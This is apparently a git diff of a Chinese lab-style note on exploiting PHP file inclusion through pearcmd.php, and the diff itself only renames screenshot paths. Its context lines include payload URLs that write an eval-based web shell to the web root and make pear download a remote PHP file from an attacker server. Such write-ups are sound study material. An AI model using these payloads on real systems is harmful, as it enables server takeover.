@@ -43,17 +43,17 @@ var_dump($_SERVER['argv']);
 
 1. 以为传了一对键值对，但是连同`=`一起存到下标0了
 
-![500](assets/pearcmd.php文件包含getshell/file-20251212225558275.png)
+![500](assets/pearcmd文件包含getshell/file-20251212232639539.png)
 
 2. 用&也没有传入两对
 
 
-![500](assets/pearcmd.php文件包含getshell/file-20251212225607871.png)
+![500](assets/pearcmd文件包含getshell/file-20251212232639538.png)
 
 3. 当我们用"+"分割时成功出现两对键值对
 
 
-![600](assets/pearcmd.php文件包含getshell/file-20251212225616903.png)
+![600](assets/pearcmd文件包含getshell/file-20251212232639537.png)
 
 ## 结论：
 $\_SERVER['argv']用加号分割不同变量
@@ -68,11 +68,11 @@ $\_SERVER['argv']用加号分割不同变量
 ?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?@eval($_POST['shell']);?>+/var/www/html/shell.php
 ```
 
-![600](assets/pearcmd.php文件包含getshell/file-20251212225728629.png)
+![600](assets/pearcmd文件包含getshell/file-20251212232639533.png)
 
 **执行成功**
 
-![700](assets/pearcmd.php文件包含getshell/file-20251212225738298.png)
+![700](assets/pearcmd文件包含getshell/file-20251212232639530.png)
 
 此时服务器上也出现了shell.php,并且里面有我们的木马
 
@@ -102,23 +102,23 @@ pear install <VPS>/phpinfo.php
 
 下面演示一下：
 
-![600](assets/pearcmd.php文件包含getshell/file-20251212225751335.png)
+![600](assets/pearcmd文件包含getshell/file-20251212232639525.png)
 
 我们在当前目录有一个test文件，我们的目标是模拟远程下载，把他下载到当前目录。
 
 1. 先起一个http服务器，共享当前文件夹
 
 
-![](assets/pearcmd.php文件包含getshell/file-20251212225805177.png)
+![](assets/pearcmd文件包含getshell/file-20251212232639523.png)
 
 2. 在docker中用pear命令下载
  
 
-![700](assets/pearcmd.php文件包含getshell/file-20251212225815117.png)
+![700](assets/pearcmd文件包含getshell/file-20251212232639522.png)
 
 看到已经下载下来了，保存在/tmp/pear/download/1.txt
 
-![800](assets/pearcmd.php文件包含getshell/file-20251212225834886.png)
+![800](assets/pearcmd文件包含getshell/file-20251212232639516.png)
 
 3. 最后我们构造成可以在web端写shell的payload
 
@@ -126,6 +126,6 @@ pear install <VPS>/phpinfo.php
 ?file=/usr/local/lib/php/pearcmd.php&+instll+http://0.0.0.0:8000/request.php
 ```
 
-![](assets/pearcmd.php文件包含getshell/file-20251212225853621.png)
+![](assets/pearcmd文件包含getshell/file-20251212232639283.png)
 
 执行成功，但是没有写入权限
